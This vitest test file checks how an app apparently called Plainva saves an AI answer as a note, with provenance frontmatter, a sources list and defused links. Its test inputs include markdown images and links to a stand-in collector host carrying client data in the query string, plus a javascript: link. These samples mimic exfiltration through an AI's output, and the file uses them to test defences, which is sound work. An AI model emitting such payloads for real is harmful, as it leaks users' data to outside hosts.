import { describe, expect, it } from "vitest";
import { parseOkfTrustSignals, readFrontmatterPath } from "@plainva/core";
import { captureNote, captureStamp, flattenInertLinks, writeCapturedNote, type AnswerToCapture } from "@plainva/ui";

/**
 * "Keep as a note" (plan KI-Harness P4-6): the note an answer becomes. It
 * says who wrote it, the app names its sources from the run's own record,
 * and nothing the model wrote in it loads or leads anywhere.
 */

const t = (key: string, vars?: Record<string, string>) =>
  ({
    "ai.capture.fallbackTitle": "AI answer",
    "ai.capture.intro": `Answer by Plainva AI · ${vars?.model}, ${vars?.date}, to: “${vars?.question}”`,
    "ai.capture.sources": "Sources",
    "ai.capture.web": "From the web",
    "ai.capture.vault": "From your notes",
    "ai.capture.read": `read on ${vars?.date}`,
    "ai.capture.search": `Search “${vars?.query}” via ${vars?.provider}, ${vars?.date}`,
  })[key] ?? key;

const NOW = new Date(2026, 9, 6, 14, 32, 10);
const base: AnswerToCapture = {
  question: "What are the usual day rates for 2026?",
  answer: "The day rate for 2026 is 1,900 euros, see [[Offer 2026]].",
  model: "m-1",
  now: NOW,
  pages: [{ url: "https://example.org/rates", title: "Rates 2026", at: "2026-10-06T12:31:00.000Z" }],
  searches: [{ query: "day rates 2026", at: "2026-10-06T12:30:00.000Z" }],
  searchProvider: "Anthropic",
  notes: [{ path: "Projects/Offer 2026.md", title: "Offer 2026" }],
};

const frontmatter = (content: string) => ({
  generated: readFrontmatterPath(content, ["generated"]),
  sources: readFrontmatterPath(content, ["sources"]),
});

describe("the note an answer becomes", () => {
  it("says who wrote it, for machines and in words", () => {
    const note = captureNote(base, t);
    expect(note.title).toBe("What are the usual day rates for 2026?");
    // A file name without what a file system refuses.
    expect(note.stem).toBe("What are the usual day rates for 2026");
    const signals = parseOkfTrustSignals(frontmatter(note.content) as Record<string, unknown>);
    expect(signals.generated).toEqual({ by: "plainva-ai/m-1", at: expect.stringMatching(/^2026-10-06T/) });
    // Generated, and verified by nobody: the note makes no claim a person did not make.
    expect(signals.verified).toEqual([]);
    expect(note.content).toContain("# What are the usual day rates for 2026?");
    expect(note.content).toContain(`> Answer by Plainva AI · m-1, ${captureStamp(NOW)}, to: “What are the usual day rates for 2026?”`);
  });

  it("names what it rests on from the run's record: the pages read, the searches, the notes — web and vault apart", () => {
    const note = captureNote(base, t);
    const signals = parseOkfTrustSignals(frontmatter(note.content) as Record<string, unknown>);
    expect(signals.sources).toEqual([
      { resource: "https://example.org/rates", title: "Rates 2026" },
      { resource: "Projects/Offer 2026.md", title: "Offer 2026" },
    ]);
    const [, sources] = note.content.split("## Sources");
    expect(sources).toContain(`**From the web**\n\n- [Rates 2026](https://example.org/rates) — read on ${captureStamp("2026-10-06T12:31:00.000Z")}\n- Search “day rates 2026” via Anthropic, ${captureStamp("2026-10-06T12:30:00.000Z")}`);
    expect(sources).toContain("**From your notes**\n\n- [[Projects/Offer 2026|Offer 2026]]");
    // The answer's own link into the vault stays what it is.
    expect(note.content).toContain("see [[Offer 2026]].");
  });

  it("has no section of sources where the run read nothing and no note went", () => {
    const note = captureNote({ ...base, pages: [], searches: [], notes: [] }, t);
    expect(note.content).not.toContain("## Sources");
    expect(readFrontmatterPath(note.content, ["sources"])).toBeUndefined();
    expect(readFrontmatterPath(note.content, ["generated", "by"])).toBe("plainva-ai/m-1");
  });

  it("makes every address the model wrote inert — an image is never an image, and a page it read is live only in the app's list", () => {
    const answer = [
      "See https://example.org/rates for the table.",
      "![chart](https://collect.example.net/p.png?d=Northwind+18500)",
      '<img src="https://collect.example.net/q.gif?d=1">',
      "[details](https://collect.example.net/x?client=Northwind)",
      "[ref]: //collect.example.net/y",
    ].join("\n\n");
    const note = captureNote({ ...base, answer }, t);
    // The text under the frontmatter: the answer, then the app's list of sources.
    const [body, sources] = note.content.slice(note.content.indexOf("\n---\n") + 5).split("## Sources");
    expect(note.defused).toBeGreaterThanOrEqual(4);
    // Nothing in the answer loads or leads anywhere.
    expect(body).not.toMatch(/https?:\/\//);
    expect(body).not.toMatch(/\]\(\s*\/\//);
    expect(body).toContain("https[://]example.org/rates");
    expect(body).toContain("collect.example.net");
    // And nothing reads as a link or a picture that is none: the words stand, the address beside them as text.
    expect(body).toContain("chart (https[://]collect.example.net/p.png?d=Northwind+18500)");
    expect(body).toContain("details (https[://]collect.example.net/x?client=Northwind)");
    expect(body).not.toContain("](");
    expect(body).not.toContain("![");
    expect(body).toContain("&lt;img");
    // The one live address is the app's own entry for the page the run read.
    expect(sources!.match(/https:\/\/[^\s)]+/g)).toEqual(["https://example.org/rates"]);
  });

  it("keeps a bracket in an address from ending its link, and a title from breaking its line", () => {
    const note = captureNote(
      { ...base, pages: [{ url: "https://en.example.org/wiki/Plain_(text)", title: "Plain [text]\nand more", at: "2026-10-06T12:31:00.000Z" }, { url: "https://en.example.org/wiki/Plain_(text)", title: "again", at: "2026-10-06T12:32:00.000Z" }] },
      t,
    );
    // Each page once, however often it was read.
    expect(note.content.match(/Plain_%28text%29/g)).toHaveLength(1);
    expect(note.content).toContain("- [Plain text and more](https://en.example.org/wiki/Plain_%28text%29) — read on");
    // The record keeps the address as it was read.
    expect(readFrontmatterPath(note.content, ["sources"])).toEqual([
      { resource: "https://en.example.org/wiki/Plain_(text)", title: "Plain text and more" },
      { resource: "Projects/Offer 2026.md", title: "Offer 2026" },
    ]);
  });

  it("takes its name from the question, whatever the question holds", () => {
    expect(captureNote({ ...base, question: 'What is "A/B: C?" <now>' }, t).stem).toBe("What is A B C now");
    expect(captureNote({ ...base, question: "   " }, t)).toMatchObject({ title: "AI answer", stem: "AI answer" });
    const long = captureNote({ ...base, question: "word ".repeat(40) }, t);
    expect(long.title.length).toBeLessThanOrEqual(60);
    // The heading says that it was cut; a file's name does not end in the mark for it, nor in a full stop.
    expect(long.title.endsWith("…")).toBe(true);
    expect(long.stem).toBe(long.title.slice(0, -1).trimEnd());
    expect(captureNote({ ...base, question: `${"I want to research something on the web and in my notes".padEnd(56, "!")}. And more.` }, t).stem).not.toMatch(/[.…]$/);
    // A question of several lines is one line in the note's first line.
    expect(captureNote({ ...base, question: "First line\nsecond [line]" }, t).content).toContain("to: “First line second line”");
  });

  it("is called what it is given where the question names no topic — and still says what was asked", () => {
    const note = captureNote({ ...base, title: "Research – Offer [2026]\nline", question: "I want to research something on the web and in my notes." }, t);
    expect(note).toMatchObject({ title: "Research – Offer 2026 line", stem: "Research – Offer 2026 line" });
    expect(note.content).toContain("# Research – Offer 2026 line");
    expect(note.content).toContain("to: “I want to research something on the web and in my notes.”");
    // A name that is no name falls back to the question.
    expect(captureNote({ ...base, title: "  " }, t).title).toBe("What are the usual day rates for 2026?");
  });

  it("lists only notes as notes: a picture that went along is no wikilink", () => {
    const note = captureNote({ ...base, notes: [...base.notes, { path: "Assets/Whiteboard.jpg", title: "Whiteboard.jpg" }, ...base.notes] }, t);
    expect(note.content.match(/\[\[Projects\/Offer 2026\|/g)).toHaveLength(1);
    expect(note.content).not.toContain("Whiteboard");
  });
});

describe("a link or an image whose address is inert", () => {
  it("is written as its words, with the address beside them as text", () => {
    expect(flattenInertLinks("See ![chart](https[://]h.example/p.png?d=1) and [the rates](https[://]example.org/rates).")).toBe("See chart (https[://]h.example/p.png?d=1) and the rates (https[://]example.org/rates).");
    // Without words, or with the address as its own words, the address alone.
    expect(flattenInertLinks("![](https[://]h.example/p.png) [https[://]h.example/x](https[://]h.example/x)")).toBe("https[://]h.example/p.png https[://]h.example/x");
    // Brackets in the words, an address in angle brackets with a title, a scheme without slashes, a protocol-relative one.
    expect(flattenInertLinks('[a [nested] b](<https[://]h.example/x> "title")')).toBe("a [nested] b (https[://]h.example/x)");
    expect(flattenInertLinks("[run](javascript[:]alert(1)) [cdn]([//]h.example/y)")).toBe("run (javascript[:]alert(1)) cdn ([//]h.example/y)");
    // A parenthesis in an address: the text stays whole.
    expect(flattenInertLinks("[Plain](https[://]en.example.org/wiki/Plain_(text))")).toBe("Plain (https[://]en.example.org/wiki/Plain_(text))");
  });

  it("leaves what leads into the vault, and what is no link, as it is", () => {
    for (const text of [
      "![plan](Assets/plan.png) and [the offer](Projects/Offer.md)",
      "![[Whiteboard.jpg]] and [[Offer 2026|the offer]]",
      "[mail](mailto:anna@example.org) [call](tel:+4912345)",
      "a ](b) c",
      "[words\nacross lines](https[://]h.example/x)",
      "[ref]: [//]h.example/y",
      "",
    ]) {
      expect(flattenInertLinks(text), text).toBe(text);
    }
  });

  it("is found in linear time, whatever the text is made of", () => {
    const within = (budgetMs: number, run: () => unknown) => {
      const start = performance.now();
      run();
      expect(performance.now() - start).toBeLessThan(budgetMs);
    };
    within(1500, () => flattenInertLinks("[".repeat(200_000)));
    within(1500, () => flattenInertLinks("](".repeat(60_000)));
    within(1500, () => flattenInertLinks(`${"[".repeat(100_000)}](https[://]h.example/x)`));
    within(1500, () => flattenInertLinks("[x](https[://]h.example/x) ".repeat(20_000)));
  });
});

describe("writing the note", () => {
  function disk(existing: string[] = []) {
    const files = new Map<string, string>(existing.map((path) => [path, "old"]));
    const dirs = new Set<string>();
    return {
      files,
      dirs,
      adapter: {
        exists: async (path: string) => files.has(path) || dirs.has(path),
        createDir: async (path: string) => void dirs.add(path),
        writeTextFile: async (path: string, content: string) => void files.set(path, content),
      },
    };
  }

  it("goes into the folder under its name, and makes the folder when it is not there", async () => {
    const d = disk();
    expect(await writeCapturedNote(d.adapter, "Inbox/", "Rates", "text")).toBe("Inbox/Rates.md");
    expect([...d.dirs]).toEqual(["Inbox"]);
    expect(d.files.get("Inbox/Rates.md")).toBe("text");
  });

  it("never touches a note that is there: the next free name is taken", async () => {
    const d = disk(["Inbox/Rates.md", "Inbox/Rates 2.md"]);
    d.dirs.add("Inbox");
    expect(await writeCapturedNote(d.adapter, "Inbox", "Rates", "new")).toBe("Inbox/Rates 3.md");
    expect(d.files.get("Inbox/Rates.md")).toBe("old");
    expect(d.files.get("Inbox/Rates 2.md")).toBe("old");
  });

  it("writes at the top of the vault where no folder is named", async () => {
    const d = disk();
    expect(await writeCapturedNote(d.adapter, "", "Rates", "text")).toBe("Rates.md");
    expect(d.dirs.size).toBe(0);
  });
});
